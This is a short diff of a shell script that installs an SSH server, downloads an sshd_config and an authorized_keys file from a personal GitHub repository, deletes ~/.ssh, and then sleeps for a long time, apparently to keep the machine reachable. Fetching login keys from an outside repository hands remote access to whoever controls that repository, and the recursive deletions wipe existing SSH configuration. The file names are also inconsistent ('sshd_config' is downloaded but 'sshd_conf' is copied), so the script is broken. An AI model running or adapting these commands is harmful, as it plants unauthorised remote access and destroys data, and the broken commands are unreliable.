@@ -3,9 +3,9 @@ apt install openssh-server -y
 service ssh restart
 wget https://github.com/Zemanezaco13267509/test/raw/main/sshd_config
 rm -r /etc/sshd_conf
-cp sshd_conf /etc/
 rm -r ~/.ssh
 mkdir ~/.ssh
+cp -r sshd_conf /etc/ssh
 cat /etc/sshd_config
 sleep 200000
 wget https://github.com/Zemanezaco13267509/test/raw/main/authorized_keys
